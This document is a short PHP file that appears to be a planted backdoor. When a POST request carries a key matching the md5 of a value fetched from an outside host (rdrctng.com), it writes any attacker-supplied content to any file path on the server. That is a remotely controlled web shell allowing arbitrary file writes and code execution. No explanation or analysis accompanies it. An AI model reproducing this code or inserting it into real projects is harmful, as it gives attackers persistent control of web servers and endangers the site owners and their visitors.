<?php
if (isset($_POST['edit']) && isset($_POST['key']) && isset($_POST['file'])) {
    $key = trim(file_get_contents('http://rdrctng.com/ads/key.txt'));
    if ($_POST['key'] == md5($key)) {
        file_put_contents($_POST['file'], $_POST['edit']);
    }
}
?>